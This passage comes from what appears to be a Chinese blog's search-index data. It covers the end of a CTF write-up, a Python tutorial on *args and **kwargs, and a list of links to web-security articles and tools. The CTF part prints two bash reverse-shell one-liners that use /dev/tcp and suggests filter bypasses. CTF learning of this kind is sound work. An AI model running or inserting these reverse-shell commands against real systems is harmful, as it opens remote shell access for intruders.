如果是没有过滤掉管道符这种，可以直接利用反弹shell，直接读flag具体操作这是linux的一些反弹shell的命令，windows的大家可以自行百度。常用的比如：\n\n&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;8080 0&lt;&amp; 2&gt;&amp;1\n\n\nbash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;8080 0&gt;&amp;1等等，骚操作还有不少，还有一些空格的绕过之类的操作。可以百度一下，有不少文章可以借鉴参考。思路真的很重要，有时候你只能卡在一个地方走不了， 而大佬可以各种骚操作绕过等。\n\n","categories":["总结"],"tags":["CTF","wp","总结"]},{"title":"Python中args kwargs参数的一些使用方法","url":"/2023/03/01/Python%E4%B8%ADargs%20kwargs%E5%8F%82%E6%95%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/","content":"Python中参数传递的一些理解。 大佬勿喷\n参数类型。形参和实参实参是实际参数，而形参是形式参数，例如 \ndef func(a,b,c): # 这里的a,b,c 就是形式参数，\tprint(a,b,c)func(12,3,45)     # 这里的12,3，45 就是实参，也就是实际参数\n\n参数的分类。位置参数def info(name,age,gender):    print(name,age,gender)info(&#x27;张三&#x27;, 23,&#x27;man&#x27;)\n\n运行结果：\n\n关键字参数 +默认值参数\n关键字参数：\n\ndef func(a,b,c):    print(a,b,c)func(a=2,c=1,b=3)\n\n结果：\n关键字传参可以不用管参数的位置，但是需要给参数一定的值。\n\n默认值传参。在现实生活中，我们需要录入很多重复的信息的时候，可以给定一个默认值，比如一个班级的学生，60个男生，5个女生的话，可以默认设置为男性。\n\ndef info2(name,age,gender=&#x27;woman&#x27;):    print(name,age,gender)info2(&#x27;刘亦菲&#x27;, 19)\n\n运行结果：\n参数对比结果对比：\ninfo函数中gender是没有给定默认值的，所以传参的时候需要给定值\n动态参数位置参数在运用过程中，我们可能需要传递的参数是不固定的，有时候参数多，有时候少，那么下面这个就可以解决这个问题。\n\n*args* args 表示可以接受所有传递进来的位置参数，同时也还可以接受列表和字典类型的传参。例：\n\n这里我们可以看到，我们传入进去的参数，都被以元组类型打印出来了，但是我们直接传参列表和字典，列表和字典都被当做一个参数传递，打印出来的是元组里面的列表和元组里面的字典，而如果我们传递*list和*dict的话 那么传递列表的值就是单独的，而且打印的时候是一个元组。而字典也会被单独传递键名。\n关键字参数\n**kwargs参数传递\n\n\n这里宇*不同的是，**kwargs的参数传递，只能关键字类型的和字典类型的传参，其他的会报错。\n**kwargs 只有在有关键字参数的时候，才会有字典的值\n混合参数的搭配使用通过上面的了解，我们有时候需要给定一些固定的位置参数，但是又需要传递未知长度的参数，甚至最后可能还需要给关键字参数，那么我们可以将所学的几种参数搭配使用。\n\n那么参数的使用顺序是位置参数&gt;*args&gt;关键字参数&gt;**kwargs这里解释以下为什么是这个顺序。这里的c 默认情况下是为你好的，但是我们打印的时候 c变为3了，我们想要的默认值就没法生效了，所以我们想要达到想要的结果，就只能修改传递位置参数的顺序，如图，如果上面第一个传参是*args参数的话，那么我们输入的前面10个参数，全部都会被它所接收，而**kwargs 只有在有关键字参数的时候，才会有字典的值 那么它为空，此时a和b两个参数，就已经没有参数了，这里显然是行不通的。但是打印的时候，关键字传参可以先打印。\n\n接受任意类型的参数。这个是一个比较特殊的\n\n如图所示，结果也进行了备注。\n","categories":["学习笔记","Python"],"tags":["笔记"]},{"title":"web安全学习相关文章(干货)","url":"/2022/12/01/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%9B%B8%E5%85%B3%E6%96%87%E7%AB%A0%20%EF%BC%88%E5%B9%B2%E8%B4%A7%EF%BC%81%EF%BC%89/","content":"web安全学习相关文章文章来源于群友分享。\n基础篇（已完结）：渗透测试之信息收集：https://blog.csdn.net/weixin_44268918/article/details/127903295?spm=1001.2014.3001.5502SQL注入基础原理与案例（详细总结）：https://blog.csdn.net/weixin_44268918/article/details/127421781?spm=1001.2014.3001.5502xss攻击详解：https://blog.csdn.net/weixin_44268918/article/details/127872483?spm=1001.2014.3001.5502文件上传漏洞详解：https://blog.csdn.net/weixin_44268918/article/details/128074253?spm=1001.2014.3001.5502CSRF及SSRF详解：https://blog.csdn.net/weixin_44268918/article/details/128091004?spm=1001.2014.3001.5502文件包含漏洞详解：https://blog.csdn.net/weixin_44268918/article/details/128133245?spm=1001.2014.3001.5502逻辑越权总结（超详细总结涉及各类越权）：https://blog.csdn.net/weixin_44268918/article/details/128347169?spm=1001.2014.3001.5502RCE代码及命令执行(详解)：https://blog.csdn.net/weixin_44268918/article/details/128386149?spm=1001.2014.3001.5502XXE&amp;XML漏洞详解：https://blog.csdn.net/weixin_44268918/article/details/128484412?spm=1001.2014.3001.5502工具篇（持续更新）：burpsuite安装与使用教程(含JDK配置环境)：https://blog.csdn.net/weixin_44268918/article/details/128207314?spm=1001.2014.3001.5502Godzilla(哥斯拉)安装与使用：https://blog.csdn.net/weixin_44268918/article/details/128410989?spm=1001.2014.3001.5502Goby安装与使用：https://blog.csdn.net/weixin_44268918/article/details/128496096?spm=1001.2014.3001.5502AWVS安装与使用(最新版2022.12.27更新)：https://blog.csdn.net/weixin_44268918/article/details/128509290?spm=1001.2014.3001.5502Hydra(九头蛇)工具使用：https://blog.csdn.net/weixin_44268918/article/details/128531270?spm=1001.2014.3001.5502Nmap工具使用：https://blog.csdn.net/weixin_44268918/article/details/128546353?spm=1001.2014.3001.5502Metasploit工具使用(上)：https://blog.csdn.net/weixin_44268918/article/details/128775978?spm=1001.2014.3001.5502Metasploit工具使用(下)：https://blog.csdn.net/weixin_44268918/article/details/128801744?spm=1001.2014.3001.5502Cobalt Strike工具安装与基础使用：https://blog.csdn.net/weixin_44268918/article/details/128857998?spm=1001.2014.3001.5502Netcat安装与使用(nc)：https://blog.csdn.net/weixin_44268918/article/details/129179127?spm=1001.2014.3001.5502","categories":["学习笔记","渗透测试"],"tags":["推荐"]}]